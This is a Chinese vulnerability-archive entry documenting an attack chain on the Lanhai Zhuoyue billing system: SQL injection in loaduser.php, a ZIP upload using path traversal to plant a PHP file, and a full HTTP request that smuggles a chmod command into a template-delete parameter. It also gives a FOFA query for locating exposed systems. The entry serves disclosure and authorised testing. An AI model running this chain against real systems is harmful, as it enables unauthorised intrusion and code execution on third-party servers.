---
source: "wy876 漏洞文库"
title: "蓝海卓越计费管理系统 loaduser SQL 注入→模板ZIP路径遍历→后台命令执行链"
product: "蓝海卓越计费管理系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "新旧版本未给编号，Linux路径与PHP CGI执行"
prerequisites: "SQLi前提未知，模板/命令执行需后台登录"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/dbwc8rx9kq4t14eb"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A/%E8%93%9D%E6%B5%B7%E5%8D%93%E8%B6%8A%E8%AE%A1%E8%B4%B9%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%A4%9A%E6%BC%8F%E6%B4%9E%E5%AF%BC%E8%87%B4getshell.md"
fofa: "title==\"蓝海卓越计费管理系统\""
id: "vw-bc40799472994c1170246895"
entity_id: "ve-bc40799472994c1170246895"
schema_version: "1"
previous_fofa_unverified: "title=="
---

# 蓝海卓越计费管理系统 loaduser SQL 注入→模板ZIP路径遍历→后台命令执行链

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：蓝海卓越计费管理系统；loaduser SQLi→模板ZIP路径遍历→后台命令执行链
- 版本、配置及部署条件：新旧版本未给编号，Linux路径与PHP CGI执行
- 认证与权限前提：SQLi前提未知，模板/命令执行需后台登录
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 多个独立漏洞链必须拆实体关联；正常UserName=1不足SQLi证明，MD5是哈希不可称解密
- 关键ZIP目录结构和报错缺失，只有外部root.zip链接未下载，不能称完整复现
- 命令执行在模板删除参数中可能先删除模板再chmod，具破坏性/持久权限变更需明确警告
- 固定时间目录不可通用
- 旧/新版本路径变化无版本标识，缺修复和链条每步响应

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
 蓝海卓越认证计费管理系统是一套以实现网络运营为基础，增强全局安全为中心，提高管理效率为目的的网络安全运营管理系统，提供“高安全、可运营、易管理”的运营管理体验，基于标准的RADIUS协议开发，它不仅支持PPPOE和WEB认证计费，还支持802.1X接入控制技术，与其他厂商支持相应标准的产品兼容，结合蓝海卓越的PPPOE服务器网关，可提供更加丰富的功能。，另外，友好的Web访问管理的方式，为用户提供更好用、易用的方式，更贴心的使用形式。蓝海卓越计费管理系统多漏洞导致getshell

## 二、影响版本
+ 蓝海卓越 计费管理系统

## 三、资产测绘
+ fofa`title=="蓝海卓越计费管理系统"`
+ 特征


## 四、漏洞复现
```plain
/ajax/loaduser.php?UserName=1
```

通过注入跑出账号密码


使用MD5解密出密码后登录系统


点击PORTAL模板下面的PORTAL模板管理，选择上传模板


[root.zip](https://www.yuque.com/attachments/yuque/0/2024/zip/29512878/1716438804359-a43f8695-df0c-4b28-83bc-e23064072257.zip)

由于新版本系统的模板位置不在web路径下，所以需要穿越模板路径

Web绝对路径：

```plain
/usr/local/usr-gui/
```

模板路径：

```plain
/mnt/mysql/usr/local/portal/themes/20240519093115_xxx/
```

制作一个如下的压缩包：


test.php内容为：字符编码必须为Unix(LF)

```plain
#!/bin/php
<?php
phpinfo();
?>
```


上传zip压缩包


Shell位置为：

```plain
/test.php
```

但是访问时会提示：


接下来就需要使用后台命令执行漏洞进行权限赋予：

```http
GET /ajax_check.php?portaltheme_del_id=4&portaltheme_del_dir=%2Fmnt%2Fmysql%2Fusr%2Flocal%2Fportal%2Fthemes%2F20210519093903_738%2F|chmod+755+/usr/local/usr-gui/test.php HTTP/1.1
Host: 
Accept: */*
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
Referer: http://124.114.151.106:8880/portaltheme_list.php
Accept-Language: zh-CN,zh;q=0.9
Cookie: mylang=zh_s; PHPSESSID=lp91fvnja6f987dj7jmkjh5601
Connection: close

```


之后再次访问

```plain
/test.php
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/dbwc8rx9kq4t14eb>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
